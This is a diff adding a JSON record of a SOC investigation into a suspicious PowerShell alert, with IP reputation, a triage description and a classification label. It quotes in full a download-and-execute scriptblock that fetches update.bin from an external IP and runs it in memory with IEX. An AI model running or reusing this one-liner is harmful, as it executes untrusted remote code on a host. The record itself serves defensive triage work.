@@ -1,0 +1,18 @@
+{
+  "investigation_notes": {
+    "Alert ID": "SOC-9471",
+    "Start Time": "2026-01-26T03:42:18.000Z",
+    "Alert Name": "Suspicious PowerShell Script Execution",
+    "Source IP": "10.2.60.77",
+    "Destination IP": "185.199.88.22",
+    "Endpoint": "SRV-APP-03",
+    "User": "a.petrov",
+    "Playbook Used": "Suspicious PowerShell Triage",
+    "Scriptblock": "$u='http://185.199.88.22/update.bin';$b=Invoke-WebRequest -Uri $u -UseBasicParsing;IEX ([Text.Encoding]::UTF8.GetString($b.Content))",
+    "External IP Reputation Summary": "Abuse Confidence Score: 0/100; ISP: KKB KREDI KAYIT BUROSU ANONIM SIRKETI; Usage Type: Commercial; Not a known VPN/Proxy/Tor/Relay",
+    "Recent Events Summary": "No recent events found.",
+    "Recent Similar Alerts": "No recent similar alerts found.",
+    "Description": "A PowerShell command executed on SRV-APP-03 under user a.petrov that downloads content from http://185.199.88.22/update.bin and immediately executes the retrieved content in memory via IEX. The initiating process hash was not available for reputation checks and there are no recent related events or similar alerts in the environment. The hardcoded external URL combined with in-memory execution on a server is high-risk behavior despite the external IP showing no current abuse detections, so the activity is considered suspicious and requires escalation."
+  },
+  "classification": "HP"
+}
